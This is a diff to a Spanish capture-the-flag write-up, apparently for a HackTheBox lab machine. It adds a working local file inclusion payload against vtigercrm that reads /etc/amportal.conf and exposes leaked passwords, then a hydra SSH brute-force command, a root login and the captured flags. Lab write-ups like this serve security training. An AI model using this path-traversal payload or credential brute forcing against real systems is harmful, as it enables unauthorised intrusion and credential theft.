@@ -94,7 +94,37 @@ asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
 spamfilter:x:500:500::/home/spamfilter:/bin/bash
 fanis:x:501:501::/home/fanis:/bin/bash
 ```
-Tenemos 6 usuarios disponibles
+Tenemos 6 usuarios disponibles veamos si las creds para alguno coinciden con las creds de la pagina
 
 ```
-
+https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+AMPDBPASS=amp109
+AMPDBPASS=jEhdIekWmdjE
+AMPMGRPASS=amp111
+FOPPASSWORD=passw0rd
+```
+Generamos una lista con los 6 usuarios y las contraseñas que tenemos y probamos con hydra
+```bash
+hydra ssh://10.10.10.7 -L users.txt -P passwords.txt
+```
+Casi inmediatamente obtenemos resultados
+```
+[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
+```
+Cuando nos logeamos nos da un pequeño problema con el intercmabio de claves
+```
+no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+```
+Para solucionarlo y poder logearnos sin problemas con el intercambio de claves usamos el siguiente comando
+```bash
+ssh root@10.10.10.7 -oKexAlgorithms=+diffie-hellman-group1-sha1
+```
+Y ya solo nos faltaría obtener las dos flag
+```
+[root@beep ~]# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+[root@beep ~]# wc -c root.txt 
+33 root.txt
+[root@beep ~]# find / -name user.txt -exec wc -c {} \; 2>/dev/null
+33 /home/fanis/user.txt
+```
